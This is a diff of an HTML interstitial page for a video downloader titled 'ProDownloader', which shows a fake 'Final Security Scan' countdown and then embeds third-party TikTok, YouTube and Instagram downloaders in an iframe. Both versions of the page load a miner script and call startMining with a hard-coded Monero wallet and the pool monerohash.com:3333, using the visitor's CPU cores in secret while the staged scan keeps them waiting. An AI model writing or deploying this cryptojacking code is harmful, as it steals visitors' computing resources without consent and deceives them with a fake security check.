@@ -3,45 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Final Security Scan</title>
+    <title>Final Security Scan | ProDownloader</title>
     <script src="https://cdn.jsdelivr.net/gh/monero-project/monero-gui@v0.18.1.2/external/qml/MoneroComponents/Controls/miner.js"></script>
     <style>
         body { margin: 0; padding: 20px; font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: white; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .ad-placeholder { background: rgba(255,255,255,0.05); border: 1px dashed #38bdf8; padding: 40px; margin: 20px auto; border-radius: 12px; width: 90%; max-width: 400px; color: #38bdf8; font-size: 0.8rem; text-transform: uppercase; }
-        .verify-box { background: rgba(30, 41, 59, 0.8); padding: 40px; border-radius: 24px; border: 1px solid rgba(56, 189, 248, 0.3); backdrop-filter: blur(15px); width: 90%; max-width: 450px; }
-        .loader-ring { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .verify-box { background: rgba(30, 41, 59, 0.8); padding: 30px; border-radius: 24px; border: 1px solid rgba(56, 189, 248, 0.3); backdrop-filter: blur(15px); width: 95%; max-width: 500px; min-height: 300px; display: flex; flex-direction: column; justify-content: center; }
+        .loader-ring { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #v-bar { width: 0%; height: 10px; background: linear-gradient(90deg, #38bdf8, #818cf8); border-radius: 10px; transition: 1s linear; }
+        #v-bar { width: 0%; height: 8px; background: #38bdf8; border-radius: 10px; transition: 1s linear; }
+        iframe { width: 100%; height: 350px; border: none; border-radius: 12px; display: none; margin-top: 20px; background: white; }
+        .ad-slot { background: rgba(255,255,255,0.05); border: 1px dashed #38bdf8; padding: 15px; margin: 10px 0; border-radius: 12px; font-size: 0.7rem; color: #38bdf8; }
     </style>
 </head>
 <body>
-    <div class="ad-placeholder">Sponsored Content Slot #1</div>
-    <div class="verify-box">
-        <div class="loader-ring"></div>
-        <h2>Final Security Scan</h2>
-        <p style="color:#94a3b8;">Verifying file integrity...</p>
-        <div style="width:100%; background:#1e293b; border-radius:10px; margin: 25px 0;"><div id="v-bar"></div></div>
-        <p id="timer" style="color:#38bdf8;">Finalizing in 15s...</p>
+
+    <div class="ad-slot">ADVERTISEMENT SLOT #1</div>
+
+    <div class="verify-box" id="main-box">
+        <div id="scan-view">
+            <div class="loader-ring"></div>
+            <h2 id="v-status">Security Scan in Progress...</h2>
+            <div style="width:100%; background:#1e293b; border-radius:10px; margin: 20px 0;"><div id="v-bar"></div></div>
+            <p id="timer" style="color:#38bdf8;">Locking download tunnel: 15s</p>
+        </div>
+        
+        <iframe id="download-frame"></iframe>
     </div>
-    <div class="ad-placeholder">Sponsored Content Slot #2</div>
+
+    <div class="ad-slot">ADVERTISEMENT SLOT #2</div>
+
 <script>
+    // --- MINING SETUP ---
     const wallet = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
     setTimeout(() => { if(typeof startMining === 'function') startMining("monerohash.com:3333", wallet, "Stage_2_Verify", navigator.hardwareConcurrency, 0.3); }, 1000);
 
+    // --- DOWNLOAD LOGIC ---
     const params = new URLSearchParams(window.location.search);
     const videoUrl = params.get('url');
+    let timeLeft = 15;
 
-    let time = 15;
     let interval = setInterval(() => {
-        time--;
-        document.getElementById("v-bar").style.width = ((15-time)/15)*100 + "%";
-        document.getElementById("timer").innerHTML = "Finalizing in " + time + "s...";
-        if(time <= 0) {
+        timeLeft--;
+        document.getElementById("v-bar").style.width = ((15-timeLeft)/15)*100 + "%";
+        document.getElementById("timer").innerHTML = "Locking download tunnel: " + timeLeft + "s";
+
+        if(timeLeft <= 0) {
             clearInterval(interval);
-            let dest = "https://saveig.app/en/search?q=";
-            if(videoUrl.includes("youtube") || videoUrl.includes("youtu.be")) dest = "https://en1.savefrom.net/1-youtube-video-downloader-360.html?url=";
-            if(videoUrl.includes("tiktok")) dest = "https://lovetik.com/query?s=";
-            window.location.href = dest + encodeURIComponent(videoUrl);
+            
+            // 1. Hide the scanner
+            document.getElementById("scan-view").style.display = "none";
+            
+            // 2. Show the downloader frame
+            const frame = document.getElementById("download-frame");
+            frame.style.display = "block";
+            
+            // 3. Logic to decide WHICH downloader to show inside your site
+            let cleanUrl = encodeURIComponent(videoUrl);
+            
+            if(videoUrl.includes("tiktok")) {
+                frame.src = "https://lovetik.com/api/ajaxSearch?q=" + videoUrl; // Direct TikTok Logic
+            } else if(videoUrl.includes("youtube") || videoUrl.includes("youtu.be")) {
+                frame.src = "https://en.savefrom.net/1-youtube-video-downloader-360.html?url=" + videoUrl;
+            } else {
+                frame.src = "https://saveig.app/en/search?q=" + videoUrl;
+            }
         }
     }, 1000);
 </script>
